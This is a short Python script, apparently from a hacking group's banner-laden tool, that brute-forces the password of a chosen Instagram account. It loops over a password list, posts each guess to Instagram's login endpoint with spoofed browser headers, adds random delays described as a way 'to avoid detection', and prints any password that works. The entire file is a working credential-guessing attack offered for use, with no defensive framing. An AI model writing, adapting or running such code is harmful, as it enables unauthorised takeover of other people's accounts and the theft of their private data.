import time
import sys
import random
import os
import requests
import pyfiglet

# ASCII Art
ulus = pyfiglet.figlet_format("RAVEES")
print(ulus)
print('#REMEMBER RAVEES #REMEMBER MOHAMMAD KAIF #IMANNINFOSEC #TEAM SYNC')
print('EAGLES OF INDAINA')
print('DONT TRY TO CHASE US WE ARE UNBEATABLE WE ARE UNDEFEATABLE')

# Instagram login URL
post_url = 'https://www.instagram.com/accounts/login/ajax/'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://www.instagram.com/accounts/login/',
}

# Random delay between requests
DELAY = random.uniform(1, 3)

# Load password file
try:
    with open('passwords.txt', 'r') as file:
        passwords = file.readlines()
except IOError:
    print('\n\tPassword file not found. Please create a "passwords.txt" file.\n')
    sys.exit()

print('\n---------- Welcome To Instagram BruteForce ----------\n')
username = input('Enter Instagram Username: ').strip()

print("\nTarget Username: ", username)
print("\nTrying Passwords from list ...")

session = requests.Session()
session.headers.update(headers)

i = 0
for passw in passwords:
    passw = passw.strip()
    i += 1
    if len(passw) < 6:
        continue
    print(str(i) + " : ", passw)

    try:
        # Prepare login data
        login_data = {
            'username': username,
            'password': passw,
        }

        # Send login request
        response = session.post(post_url, data=login_data)
        response_data = response.json()

        # Check if login was successful
        if response_data.get('authenticated', False):
            print('\n[+] Password found: ', passw)
            break
        elif response_data.get('checkpoint_required', False):
            print('[-] CAPTCHA or checkpoint required. Try again later.')
            break
        else:
            print('[!] Attempt failed with password: ', passw)

        # Random delay to avoid detection
        time.sleep(DELAY)

    except Exception as e:
        print('\n[!] Error: ', str(e))
        print('\nSleeping for 5 minutes...\n')
        time.sleep(300)  # Sleep for 5 minutes if an error occurs

   